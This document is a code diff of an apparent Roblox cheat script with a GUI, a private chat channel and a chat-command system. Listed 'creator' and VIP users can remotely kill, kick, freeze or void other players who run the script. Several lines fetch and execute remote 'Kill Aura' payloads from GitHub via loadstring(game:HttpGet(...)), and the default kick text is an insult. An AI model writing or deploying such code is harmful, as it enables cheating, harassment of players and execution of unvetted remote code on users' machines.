+    local CmdSide = CreateSection(MasterFrame, UDim2.new(0, 250, 0.94, 0))
+    local CTitle = Instance.new("TextLabel", CmdSide); CTitle.Size = UDim2.new(1,0,0,30); CTitle.Text = "COMMANDS"; CTitle.TextColor3 = Color3.fromRGB(255, 50, 50); CTitle.Font = Enum.Font.FredokaOne; CTitle.BackgroundTransparency = 1; CTitle.TextSize = 16
+    local HelpTxt = Instance.new("TextLabel", CmdSide); HelpTxt.Size = UDim2.new(1,0,0,100); HelpTxt.Position = UDim2.new(0,0,0,30); HelpTxt.Text = "!kill [n] | !kick [n] | !tp [n]\n!freeze [n] | !spin [n] | !void [n]\n!givevip [n] | !killall | !kickall"; HelpTxt.TextColor3 = Color3.fromRGB(180,180,180); HelpTxt.Font = Enum.Font.SourceSansBold; HelpTxt.TextSize = 11; HelpTxt.BackgroundTransparency = 1
+    KickTextInp = Instance.new("TextBox", CmdSide); KickTextInp.Size = UDim2.new(1,0,0,25); KickTextInp.Position = UDim2.new(0,0,0,135); KickTextInp.Text = "โดนกูเตะไงไอ้ควาย"; KickTextInp.BackgroundColor3 = Color3.fromRGB(30,30,30); KickTextInp.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", KickTextInp)
+    KickSoundInp = Instance.new("TextBox", CmdSide); KickSoundInp.Size = UDim2.new(1,0,0,25); KickSoundInp.Position = UDim2.new(0,0,0,165); KickSoundInp.Text = "rbxassetid://137337370812885"; KickSoundInp.BackgroundColor3 = Color3.fromRGB(30,30,30); KickSoundInp.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", KickSoundInp)
+    local CmdBar = Instance.new("TextBox", CmdSide); CmdBar.Size = UDim2.new(1,0,0,35); CmdBar.Position = UDim2.new(0,0,1,-35); CmdBar.PlaceholderText = "> ENTER COMMAND..."; CmdBar.BackgroundColor3 = Color3.fromRGB(20,40,20); CmdBar.TextColor3 = Color3.fromRGB(0,255,0); Instance.new("UICorner", CmdBar)
+    CmdSide.Visible = (ADMIN_COMMANDER[MyName] ~= nil or _G.VIP_LIST[MyName] ~= nil)
 
-local MinAdminBtn = CreateBtn("🛡", UDim2.new(0.95, -50, 0.3, 60), Color3.fromRGB(255, 0, 0))
-MinAdminBtn.Visible = (ADMIN_COMMANDER[Player.Name] ~= nil)
-MinAdminBtn.MouseButton1Click:Connect(function() AdminPanel.Visible = not AdminPanel.Visible end)
+    -- CHAT SECTION
+    local ChatSide = CreateSection(MasterFrame, UDim2.new(0, 250, 0.94, 0))
+    local ChatTitle = Instance.new("TextLabel", ChatSide); ChatTitle.Size = UDim2.new(1,0,0,30); ChatTitle.Text = "PRIVATE CHAT"; ChatTitle.TextColor3 = Color3.fromRGB(0, 255, 255); ChatTitle.Font = Enum.Font.FredokaOne; ChatTitle.BackgroundTransparency = 1; ChatTitle.TextSize = 16
+    local ChatScroll = Instance.new("ScrollingFrame", ChatSide); ChatScroll.Size = UDim2.new(1,0,1,-75); ChatScroll.Position = UDim2.new(0,0,0,35); ChatScroll.BackgroundTransparency = 0.9; ChatScroll.ScrollBarThickness = 2
+    local ChatList = Instance.new("UIListLayout", ChatScroll); ChatList.Padding = UDim.new(0,2); ChatList.SortOrder = Enum.SortOrder.LayoutOrder
+    local ChatInput = Instance.new("TextBox", ChatSide); ChatInput.Size = UDim2.new(1,0,0,35); ChatInput.Position = UDim2.new(0,0,1,-35); ChatInput.PlaceholderText = "Type message here..."; ChatInput.BackgroundColor3 = Color3.fromRGB(20,20,40); ChatInput.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", ChatInput)
 
-local MinChatBtn = CreateBtn("💬", UDim2.new(0.95, -50, 0.3, 120), Color3.fromRGB(0, 200, 200))
-MinChatBtn.MouseButton1Click:Connect(function() ChatFrame.Visible = not ChatFrame.Visible end)
+    -- MINIMIZE BUTTON
+    local MinBtn = Instance.new("TextButton", MainGui); MinBtn.Size = UDim2.new(0, 50, 0, 50); MinBtn.Position = UDim2.new(0.1, 0, 0.1, 0); MinBtn.BackgroundColor3 = Color3.fromRGB(255, 200, 0); MinBtn.Text = "SW"; MinBtn.Font = Enum.Font.FredokaOne; MinBtn.TextSize = 20; MinBtn.TextColor3 = Color3.new(0,0,0); Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(1, 0); Instance.new("UIStroke", MinBtn).Thickness = 2; MakeDraggable(MinBtn)
+    MinBtn.MouseButton1Click:Connect(function() MasterFrame.Visible = not MasterFrame.Visible; PlayUISound(452267918) end)
 
-local function UpdateBoard()
-    for _, v in pairs(Scroll:GetChildren()) do if v:IsA("TextLabel") then v:Destroy() end end
-    Instance.new("UIListLayout", Scroll).Padding = UDim.new(0, 4)
-    for _, p in pairs(game.Players:GetPlayers()) do
-        if ACTIVE_USERS[p.Name] or _G.VIP_LIST[p.Name] or ADMIN_COMMANDER[p.Name] or GIFTED_LIST[p.Name] or HAS_COMMAND_POWER[p.Name] then
-            local tag, color = "[ACTIVE]", Color3.fromRGB(100, 255, 100)
-            if ADMIN_COMMANDER[p.Name] then tag, color = "[CREATOR]", Color3.fromRGB(255,50,50)
-            elseif _G.VIP_LIST[p.Name] then tag, color = "[VIP]", Color3.fromRGB(255,215,0)
-            elseif HAS_COMMAND_POWER[p.Name] then tag, color = "[CMD]", Color3.fromRGB(255,0,255)
-            elseif GIFTED_LIST[p.Name] then tag, color = "[GFT]", Color3.fromRGB(0,255,255) end
-            local l = Instance.new("TextLabel", Scroll)
-            l.Size = UDim2.new(1, -5, 0, 22); l.Text = " " .. tag .. " " .. p.Name
-            l.TextColor3 = color; l.BackgroundTransparency = 1; l.Font = Enum.Font.FredokaOne; l.TextSize = 12
-            l.TextXAlignment = Enum.TextXAlignment.Left
+    local function UpdateBoard()
+        for _, v in pairs(BScroll:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end
+        for _, p in pairs(game.Players:GetPlayers()) do
+            if ACTIVE_USERS[p.Name] or _G.VIP_LIST[p.Name] or ADMIN_COMMANDER[p.Name] or HAS_COMMAND_POWER[p.Name] then
+                local tag, color = "[ACTIVE]", Color3.fromRGB(0, 255, 150)
+                if ADMIN_COMMANDER[p.Name] then tag, color = "[CREATOR]", Color3.fromRGB(255, 40, 40) elseif _G.VIP_LIST[p.Name] then tag, color = "[VIP]", Color3.fromRGB(255, 215, 0) elseif HAS_COMMAND_POWER[p.Name] then tag, color = "[CMD]", Color3.fromRGB(200, 0, 255) end
+                
+                local row = Instance.new("Frame", BScroll); row.Size = UDim2.new(1,-5,0,25); row.BackgroundTransparency = 0.8; row.BackgroundColor3 = color
+                local l = Instance.new("TextLabel", row); l.Size = UDim2.new(0.7,0,1,0); l.Text = tag.." "..p.Name; l.TextColor3 = color; l.BackgroundTransparency = 1; l.Font = Enum.Font.SourceSansBold; l.TextSize = 11; l.TextXAlignment = Enum.TextXAlignment.Left; l.Position = UDim2.new(0,5,0,0)
+                
+                -- GIFT VIP BUTTON (G)
+                local gBtn = Instance.new("TextButton", row)
+                gBtn.Size = UDim2.new(0, 18, 0, 18); gBtn.Position = UDim2.new(1, -45, 0.5, -9); gBtn.Text = "V"; gBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 0); gBtn.TextColor3 = Color3.new(1,1,1); gBtn.Font = Enum.Font.SourceSansBold; gBtn.TextSize = 12; Instance.new("UICorner", gBtn)
+                gBtn.MouseButton1Click:Connect(function() local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"); if chatEvent then chatEvent.SayMessageRequest:FireServer("!givevip "..p.Name, "All") end end)
+
+                -- GIFT CMD BUTTON (C) - เฉพาะ Admin เห็น
+                local cBtn = Instance.new("TextButton", row)
+                cBtn.Size = UDim2.new(0, 18, 0, 18); cBtn.Position = UDim2.new(1, -22, 0.5, -9); cBtn.Text = "C"; cBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 255); cBtn.TextColor3 = Color3.new(1,1,1); cBtn.Font = Enum.Font.SourceSansBold; cBtn.TextSize = 12; Instance.new("UICorner", cBtn)
+                cBtn.Visible = (ADMIN_COMMANDER[MyName] ~= nil)
+                cBtn.MouseButton1Click:Connect(function() local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"); if chatEvent then chatEvent.SayMessageRequest:FireServer("!cmd "..p.Name, "All") end end)
+
+                BScroll.CanvasSize = UDim2.new(0,0,0,BList.AbsoluteContentSize.Y)
+            end
         end
     end
-end
 
-task.spawn(function() while task.wait(3) do UpdateBoard() end end)
-
-local function ListenChat(speaker, msg)
-    local args = msg:split(" ")
-    local cmd = args[1]:lower()
-
-    local function findTarget(name)
-        if not name then return nil end
-        if name == "me" or name == "all" then return name end
-        for _,p in pairs(game.Players:GetPlayers()) do if p.Name:lower():sub(1,#name)==name:lower() then return p end end
-        return nil
+    local function AddChatMessage(sender, msg, color)
+        local l = Instance.new("TextLabel", ChatScroll); l.Size = UDim2.new(1,-10,0,20); l.BackgroundTransparency = 1; l.Text = "["..sender.."]: "..msg; l.TextColor3 = color or Color3.new(1,1,1); l.Font = Enum.Font.SourceSansBold; l.TextSize = 13; l.TextXAlignment = Enum.TextXAlignment.Left; l.TextWrapped = true; l.AutomaticSize = Enum.AutomaticSize.Y
+        task.wait(0.05); ChatScroll.CanvasPosition = Vector2.new(0, ChatList.AbsoluteContentSize.Y)
     end
-    local target = args[2] and findTarget(args[2])
 
-    -- [PUBLIC COMMANDS]
-    if target then
-        local isTargetMe = (target == "me" and speaker == Player) or (typeof(target) == "Instance" and target == Player) or (target == "all")
+    ChatInput.FocusLost:Connect(function(enter)
+        if enter and ChatInput.Text ~= "" then
+            local color = ADMIN_COMMANDER[MyName] and Color3.fromRGB(255,50,50) or (_G.VIP_LIST[MyName] and Color3.fromRGB(255,215,0) or Color3.fromRGB(0,255,255))
+            AddChatMessage(MyName, ChatInput.Text, color)
+            local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            if chatEvent then chatEvent.SayMessageRequest:FireServer("[SW_CHAT]"..ChatInput.Text, "All") end; ChatInput.Text = ""
+        end
+    end)
+
+    local function CustomKick()
+        local s = Instance.new("Sound", game.Workspace); s.SoundId = KickSoundInp.Text; s.Volume = 5; s:Play()
+        local sg = Instance.new("ScreenGui", game.CoreGui); sg.IgnoreGuiInset = true; local tx = Instance.new("TextLabel", sg); tx.BackgroundColor3 = Color3.new(0,0,0); tx.Size = UDim2.new(1,0,1,0); tx.Text = KickTextInp.Text; tx.TextColor3 = Color3.new(1,0,0); tx.TextScaled = true; tx.ZIndex = 9999; task.wait(3.5); Player:Kick("\n\n[ Humanx1 System ]\n"..KickTextInp.Text.."\n"); sg:Destroy()
+    end
+
+    local function ListenChat(speaker, msg)
+        local args = msg:split(" "); local cmd = args[1]:lower()
+        local function findTarget(name)
+            if not name then return nil end
+            if name == "me" or name == "all" then return name end
+            for _,p in pairs(game.Players:GetPlayers()) do if p.Name:lower():sub(1,#name)==name:lower() then return p end end
+            return nil
+        end
+        local target = args[2] and findTarget(args[2])
+
+        if msg == "[ScriptWord_Ping]" then ACTIVE_USERS[speaker.Name] = true; UpdateBoard(); return end
+        if msg:sub(1,9) == "[SW_CHAT]" then if speaker.Name ~= MyName then AddChatMessage(speaker.Name, msg:sub(10), Color3.fromRGB(0,255,255)) end return end
+
+        local hasPower = ADMIN_COMMANDER[speaker.Name] or HAS_COMMAND_POWER[speaker.Name] or _G.VIP_LIST[speaker.Name]
         
-        if isTargetMe then
-            local char = Player.Character
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if target == "me" or (typeof(target) == "Instance" and target == Player) or (target == "all") then
+            local char = Player.Character; local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            if cmd == "!spin" and hrp then
+                local speed = tonumber(args[3]) or 50; local bgv = hrp:FindFirstChild("Spin") or Instance.new("BodyAngularVelocity", hrp)
+                bgv.Name = "Spin"; bgv.MaxTorque = Vector3.new(0, math.huge, 0); bgv.AngularVelocity = Vector3.new(0, speed, 0)
+            elseif cmd == "!unspin" and hrp then if hrp:FindFirstChild("Spin") then hrp.Spin:Destroy() end
+            elseif cmd == "!fire" and hrp then Instance.new("Fire", hrp).Name = "SW_Fire"
+            elseif cmd == "!smoke" and hrp then Instance.new("Smoke", hrp).Name = "SW_Smoke"
+            end
+        end
+
+        if hasPower then
+            if speaker ~= Player then PlayUISound(203785501) end
+            if cmd == "!void" then if target == "all" then for _,p in pairs(game.Players:GetPlayers()) do if p ~= speaker then VOID_TARGETS[p.Name] = true end end elseif typeof(target) == "Instance" then VOID_TARGETS[target.Name] = true end end
+            if cmd == "!unvoid" then if target == "all" then VOID_TARGETS = {} elseif typeof(target) == "Instance" then VOID_TARGETS[target.Name] = nil end end
             
-            if cmd == "!sound" then
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/%E0%B8%82%E0%B9%82%E0%B8%A1%E0%B8%A2%E0%B9%80%E0%B8%AA%E0%B8%B5%E0%B8%A2%E0%B8%87"))()
-            
-            elseif cmd == "!spin" and hrp then
-                local speed = tonumber(args[3]) or 50
-                local bgv = hrp:FindFirstChild("SpinVelocity") or Instance.new("BodyAngularVelocity", hrp)
-                bgv.Name = "SpinVelocity"
-                bgv.MaxTorque = Vector3.new(0, math.huge, 0)
-                bgv.AngularVelocity = Vector3.new(0, speed, 0)
-
-            elseif cmd == "!unspin" and hrp then
-                local bgv = hrp:FindFirstChild("SpinVelocity")
-                if bgv then bgv:Destroy() end
-
-            elseif cmd == "!fire" and char then
-                local f = Instance.new("Fire", hrp or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"))
-                f.Name = "SW_Fire"
-
-            elseif cmd == "!firerb" and char then
-                local f = Instance.new("Fire", hrp or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"))
-                f.Name = "SW_FireRB"
-                task.spawn(function()
-                    while f.Parent do
-                        f.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
-                        f.SecondaryColor = Color3.fromHSV((tick() + 0.5) % 5 / 5, 1, 1)
-                        task.wait()
-                    end
-                end)
-
-            elseif cmd == "!smoke" and char then
-                Instance.new("Smoke", hrp or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")).Name = "SW_Smoke"
+            if cmd == "!cmd" or cmd == "!givevip" then
+                if target == Player then
+                    HAS_COMMAND_POWER[Player.Name] = true; CmdSide.Visible = true; UpdateBoard()
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
+                end
             end
-        end
-    end
-
-    -- [SYSTEM LOGIC]
-    if msg == "[ScriptWord_Ping]" then
-        ACTIVE_USERS[speaker.Name] = true
-        UpdateBoard()
-        return
-    end
-
-    if msg:sub(1, 9) == "[SW_CHAT]" then
-        if speaker.Name ~= MyName then
-            local realMsg = msg:sub(10)
-            AddChatMessage(speaker.Name, realMsg, GetChatColor(speaker.Name))
-        end
-        return
-    end
-
-    -- [ADMIN/CMD ONLY COMMANDS] - ตรวจสอบสิทธิ์เฉพาะ Admin หรือคนที่มี Cmd Power
-    local hasCommandPower = ADMIN_COMMANDER[speaker.Name] or HAS_COMMAND_POWER[speaker.Name]
-
-    if hasCommandPower then
-        if speaker ~= Player then PlayUISound(203785501) end
-        
-        -- [[ VOID SYSTEM ]]
-        if cmd == "!void" and target then
-            if target == "all" then
-                for _,p in pairs(game.Players:GetPlayers()) do if p ~= speaker then VOID_TARGETS[p.Name] = true end end
-            elseif typeof(target) == "Instance" then
-                VOID_TARGETS[target.Name] = true
+            if target == Player then
+                if cmd == "!kick" then CustomKick() 
+                elseif cmd == "!kill" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
+                elseif cmd == "!tp" then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
+                elseif cmd == "!freeze" then Player.Character.HumanoidRootPart.Anchored = true 
+                elseif cmd == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false end
             end
-        elseif cmd == "!unvoid" and target then
-            if target == "all" then
-                VOID_TARGETS = {}
-            elseif typeof(target) == "Instance" then
-                VOID_TARGETS[target.Name] = nil
-            end
-        end
-
-        if ADMIN_COMMANDER[speaker.Name] and cmd == "!cmd" and target == Player then
-            HAS_COMMAND_POWER[Player.Name] = true
-            AdminPanel.Visible = true; MinAdminBtn.Visible = true
-            UpdateBoard()
-        end
-
-        if target == Player then
-            if cmd == "!kick" then CustomKick()
-            elseif cmd == "!kill" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
-            elseif cmd == "!tp" then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
-            elseif cmd == "!freeze" then Player.Character.HumanoidRootPart.Anchored = true
-            elseif cmd == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false end
-        end
-
-        if cmd == "!killall" then 
-            if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
-        elseif cmd == "!kickall" then 
-            CustomKick() 
+            if cmd == "!killall" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end elseif cmd == "!kickall" then CustomKick() end
         end
     end
 
-    -- [VIP GIVE GIFT] - เฉพาะ VIP หรือ Admin
-    if ADMIN_COMMANDER[speaker.Name] or _G.VIP_LIST[speaker.Name] or HAS_COMMAND_POWER[speaker.Name] then
-        if cmd == "!givevip" and target == Player then
-            GIFTED_LIST[Player.Name] = speaker.Name 
-            UpdateBoard()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
-        end
+    ACTIVE_USERS[MyName] = true 
+    task.spawn(function() task.wait(2); local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"); if chatEvent then chatEvent.SayMessageRequest:FireServer("[ScriptWord_Ping]", "All") end end)
+    CmdBar.FocusLost:Connect(function(e) if e then PlayUISound(452267918); ListenChat(Player, CmdBar.Text); CmdBar.Text = "" end end)
+    game.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) ListenChat(p,m) end); UpdateBoard() end)
+    for _,p in pairs(game.Players:GetPlayers()) do p.Chatted:Connect(function(m) ListenChat(p,m) end) end
+    game.Players.PlayerRemoving:Connect(function(p) ACTIVE_USERS[p.Name] = nil; UpdateBoard() end)
+
+    if _G.VIP_LIST[MyName] or ADMIN_COMMANDER[MyName] then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
+    else
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/kill%20aura%20City%20Thailand%202"))()
     end
+    UpdateBoard(); task.spawn(function() while task.wait(5) do UpdateBoard() end end)
 end
 
--- ทำให้คนรันสคริปต์ทุกคนขึ้นบอร์ด
-ACTIVE_USERS[MyName] = true 
-task.spawn(function()
-    task.wait(2)
-    local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-    if chatEvent then 
-        chatEvent.SayMessageRequest:FireServer("[ScriptWord_Ping]", "All") 
-    end
+StartBtn.MouseButton1Click:Connect(function()
+    if NameInput.Text == ExpectedName then RunMainScript()
+    else StartBtn.Text = "ชื่อไม่ถูกต้อง!"; StartBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0); task.wait(1); StartBtn.Text = "START SCRIPT"; StartBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0) end
 end)
-
-CmdBar.FocusLost:Connect(function(e) if e then PlayUISound(452267918); ListenChat(Player, CmdBar.Text); CmdBar.Text = "" end end)
-game.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) ListenChat(p,m) end); UpdateBoard() end)
-for _,p in pairs(game.Players:GetPlayers()) do p.Chatted:Connect(function(m) ListenChat(p,m) end) end
-game.Players.PlayerRemoving:Connect(function(p) ACTIVE_USERS[p.Name] = nil; UpdateBoard() end)
-
-if _G.VIP_LIST[MyName] or ADMIN_COMMANDER[MyName] then
-    if ADMIN_COMMANDER[MyName] then AdminPanel.Visible = true end
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
-else
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/kill%20aura%20City%20Thailand%202"))()
-end
-UpdateBoard()
